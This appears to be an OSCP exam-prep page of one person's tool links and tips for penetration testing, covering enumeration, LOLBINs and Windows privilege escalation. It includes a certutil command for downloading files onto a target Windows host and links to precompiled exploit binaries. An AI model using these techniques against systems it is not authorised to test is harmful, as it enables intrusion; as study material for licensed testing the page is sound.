# Aaron Goldstein

Interview is [here](https://www.google.com/url?q=https://docs.google.com/document/d/19qvO3jXZMhgNs-Y5xcOGFr6GH5GurZs-agdC4JFl7nk/edit?usp%3Dsharing&sa=D&source=calendar&usd=2&usg=AOvVaw1sRK9ZMXHSImFsmq7DRgKS).

## Links

* [https://pentest.ws/](https://pentest.ws/) - Great site for tracking progress against machines \(can import nmap data for tracking too\). I use this all the time for the Venom builder \(shell creation\) and other cool stuff. The free version works great.
* [AutoRecon](https://github.com/Tib3rius/AutoRecon) is the tool I used for automating the enumeration process \(and OSCP exam approved\) I also used a LOLBIN \(Living off the Land Binary\) to download files from the Windows box - the command was "**Certutil -urlcache -split -f &lt;link to file to download&gt;**"These are great because most systems will already have them installed. 
* [Here](https://lolbas-project.github.io/) is a great site that outlines TONS of them.
* A few links / tools that helped me with Windows Privesc:List of pre-compiled binaries for different exploits - [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [WATSON](https://github.com/carlospolop/winPE/tree/master/binaries/watson) -tool for identifying exploits for Windows privesc - requires .NET - runs on target host   Quick method to check what version of .NET is installed on host \(needed for Watson\)- reg query "HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
* [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) - This is a great tool for finding exploits on windows hosts for privesc too - but this one takes in the "systeminfo" from the target host and runs locally on the attacker system

  ---

Key takeaways :

* 
